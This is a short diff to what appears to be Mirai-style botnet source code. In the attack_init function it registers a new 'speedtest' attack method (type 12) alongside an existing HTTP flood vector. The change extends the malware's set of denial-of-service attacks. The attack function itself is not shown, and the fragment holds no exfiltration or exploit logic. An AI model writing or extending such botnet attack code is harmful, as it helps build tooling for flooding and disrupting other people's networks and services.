@@ -41,6 +41,10 @@ BOOL attack_init(void)
     // HTTP method (11)
     add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);        // Type 11
 
+    //speedtest method (12)
+    add_attack(ATK_VEC_SPEEDTEST, (ATTACK_FUNC)attack_speedtest);  // Type 12
+    
+
     return TRUE;
 }
 
